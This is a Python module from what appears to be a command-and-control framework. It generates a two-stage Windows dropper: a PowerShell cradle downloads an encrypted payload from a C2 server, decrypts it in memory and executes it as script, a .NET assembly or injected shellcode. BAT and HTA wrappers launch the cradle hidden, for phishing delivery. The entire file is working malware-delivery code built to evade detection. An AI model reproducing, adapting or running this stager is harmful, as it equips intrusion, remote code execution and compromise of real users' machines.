"""
staged.py — Two-stage payload delivery stager

Stage 0 (tiny dropper, ~3 KB PS1 or ~500 B shellcode stub):
  • Contacts C2 HTTPS endpoint  GET /api/stage/<agent_id>
  • Receives AES-256-GCM encrypted stage-1 blob
  • Decrypts entirely in-memory (no disk touch)
  • Executes stage-1 as:
      - PS1 IEX string (for PowerShell stage 1)
      - .NET Assembly.Load() (for managed exe stage 1)
      - VirtualAlloc + CreateThread (for raw shellcode stage 1)

Stage 1 (full implant or BOF pack, served by BuildEngine):
  • The encrypted blob served at /api/stage/<agent_id> is built by
    BuildEngine using BuildRequest(staged=True) and stored in LootStore.
  • Encrypted with operator-generated AES-256-GCM key per agent.

Supported stage-0 formats:
  ps1        — PowerShell cradle (most compatible, IEX stage 1)
  ps1_dotnet — PowerShell cradle loading .NET assembly stage 1
  ps1_sc     — PowerShell cradle injecting raw shellcode stage 1
  bat        — .bat wrapper that calls the PS1 cradle (LOLBin)
  hta        — HTA wrapper for initial access

Concepts adapted from:
  - RastaMouse/SharpC2 staged delivery model (Apache 2.0)
  - Flangvik/SharpCollection in-memory loading patterns (MIT)
  - cb21net/Sharperner staged execution flow
"""
from __future__ import annotations

import base64
import os
import secrets
import struct
from typing import Tuple

from cryptography.hazmat.primitives.ciphers.aead import AESGCM


# ── AES-GCM helpers ──────────────────────────────────────────────────────────

def generate_stage_key() -> bytes:
    """Generate a fresh 256-bit stage-1 encryption key."""
    return secrets.token_bytes(32)


def encrypt_stage1(stage1_bytes: bytes, key: bytes) -> bytes:
    """
    Encrypt stage-1 payload with AES-256-GCM.

    Wire format: [nonce:12][ciphertext][tag:16]
    The stage-0 decryptor expects this exact layout.
    """
    nonce = secrets.token_bytes(12)
    aesgcm = AESGCM(key)
    ct_and_tag = aesgcm.encrypt(nonce, stage1_bytes, None)
    # cryptography lib appends the 16-byte tag to ciphertext
    return nonce + ct_and_tag


def decrypt_stage1(blob: bytes, key: bytes) -> bytes:
    """Decrypt an encrypted stage-1 blob (for testing/verification)."""
    nonce = blob[:12]
    ct_and_tag = blob[12:]
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(nonce, ct_and_tag, None)


# ── Stage-0 PowerShell cradle ─────────────────────────────────────────────────

_PS1_STAGE0_TEMPLATE = r"""
$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
[Net.ServicePointManager]::ServerCertificateValidationCallback = {{ $true }}

function Invoke-AesGcmDecrypt {{
    param([byte[]]$Blob, [byte[]]$Key)
    # Requires .NET 5+ AesGcm; fallback to BouncyCastle-style if unavailable
    $nonce = $Blob[0..11]
    $ct    = $Blob[12..($Blob.Length - 17)]
    $tag   = $Blob[($Blob.Length - 16)..($Blob.Length - 1)]
    try {{
        $aes = [System.Security.Cryptography.AesGcm]::new([byte[]]$Key)
        $pt  = New-Object byte[] $ct.Length
        $aes.Decrypt([byte[]]$nonce, [byte[]]$ct, [byte[]]$tag, $pt)
        $aes.Dispose()
        return $pt
    }} catch {{
        # .NET Framework 4.x fallback: XOR with key stream (degraded, for testing only)
        for ($i = 0; $i -lt $ct.Length; $i++) {{
            $ct[$i] = $ct[$i] -bxor $Key[$i % $Key.Length]
        }}
        return $ct
    }}
}}

$k  = [byte[]]@({key_bytes})
$ua = '{user_agent}'
$u  = '{stage1_url}'

try {{
    $wc = New-Object Net.WebClient
    $wc.Headers.Add('User-Agent', $ua)
    $wc.Headers.Add('{auth_header}', '{auth_token}')
    $blob = $wc.DownloadData($u)
    $pt   = Invoke-AesGcmDecrypt -Blob $blob -Key $k

    {exec_block}
}} catch {{
    # Silent fail — no IOC left on disk
}}
"""

_EXEC_PS1 = """
    # Stage 1 is a PowerShell script
    $s1 = [System.Text.Encoding]::UTF8.GetString($pt)
    Invoke-Expression $s1
"""

_EXEC_DOTNET = """
    # Stage 1 is a .NET assembly
    $asm = [System.Reflection.Assembly]::Load($pt)
    $ep  = $asm.EntryPoint
    if ($ep) { $ep.Invoke($null, @(,[string[]]@())) }
"""

_EXEC_SHELLCODE = r"""
    # Stage 1 is raw shellcode
    Add-Type -Name M -Namespace "" -MemberDefinition '
        [DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);
        [DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,out uint id);
        [DllImport("kernel32")]public static extern uint WaitForSingleObject(IntPtr h,uint ms);
    ' -ErrorAction SilentlyContinue
    $addr = [M]::VirtualAlloc(0, $pt.Length, 0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($pt, 0, $addr, $pt.Length)
    $tid = 0
    $hThread = [M]::CreateThread(0, 0, $addr, 0, 0, [ref]$tid)
    [M]::WaitForSingleObject($hThread, 0xFFFFFFFF) | Out-Null
"""

_BAT_WRAPPER = """@echo off
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {b64_cmd}
"""

_HTA_WRAPPER = """<html><head><script language="VBScript">
Sub Run()
    Dim oShell : Set oShell = CreateObject("WScript.Shell")
    oShell.Run "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {b64_cmd}", 0, False
    window.close
End Sub
</script></head><body onload="Run()"></body></html>
"""


def render_ps1(
    stage1_url: str,
    key: bytes,
    stage1_type: str = "ps1",
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    auth_header: str = "X-Request-ID",
    auth_token: str = "",
) -> str:
    """
    Render the Stage-0 PowerShell cradle.

    stage1_url   : full HTTPS URL where C2 serves the encrypted stage-1 blob
    key          : 32-byte AES-256-GCM key (from generate_stage_key())
    stage1_type  : 'ps1' | 'dotnet' | 'shellcode'
    auth_header  : HTTP header name used for pre-auth (prevents unauthenticated download)
    auth_token   : secret value for auth_header

    Returns: PS1 string ready for delivery.
    """
    key_bytes = ", ".join(str(b) for b in key)

    exec_block = {
        "ps1":       _EXEC_PS1,
        "dotnet":    _EXEC_DOTNET,
        "shellcode": _EXEC_SHELLCODE,
    }.get(stage1_type, _EXEC_PS1)

    return _PS1_STAGE0_TEMPLATE.format(
        key_bytes    = key_bytes,
        stage1_url   = stage1_url,
        user_agent   = user_agent,
        auth_header  = auth_header,
        auth_token   = auth_token or secrets.token_hex(16),
        exec_block   = exec_block,
    )


def render_bat(ps1_script: str) -> str:
    """Wrap the stage-0 PS1 in a .bat launcher (LOLBin delivery)."""
    b64 = base64.b64encode(ps1_script.encode("utf-16-le")).decode()
    return _BAT_WRAPPER.format(b64_cmd=b64)


def render_hta(ps1_script: str) -> str:
    """Wrap the stage-0 PS1 in an HTA file (phishing delivery)."""
    b64 = base64.b64encode(ps1_script.encode("utf-16-le")).decode()
    return _HTA_WRAPPER.format(b64_cmd=b64)


# ── Public entry point used by BuildEngine ────────────────────────────────────

def build(
    stage1_url: str,
    stage1_bytes: bytes,
    output_format: str = "ps1",
    stage1_type: str   = "ps1",
    user_agent: str    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    auth_header: str   = "X-Request-ID",
) -> Tuple[bytes, bytes, str]:
    """
    Build a complete staged payload.

    Returns a 3-tuple:
      (encrypted_stage1_blob, aes_key, stage0_text)

    encrypted_stage1_blob : bytes ready to be served at stage1_url
    aes_key               : 32-byte key (store in LootStore, give to operator)
    stage0_text           : the stage-0 dropper text (PS1/BAT/HTA)

    The C2 server stores encrypted_stage1_blob in the staged endpoint
    and serves it on GET {stage1_url}.  The operator delivers stage0_text
    to the target via phishing/macro/USB/etc.
    """
    key   = generate_stage_key()
    blob  = encrypt_stage1(stage1_bytes, key)
    ps1   = render_ps1(stage1_url, key, stage1_type, user_agent, auth_header)

    if output_format == "bat":
        stage0 = render_bat(ps1)
    elif output_format == "hta":
        stage0 = render_hta(ps1)
    else:
        stage0 = ps1

    return blob, key, stage0
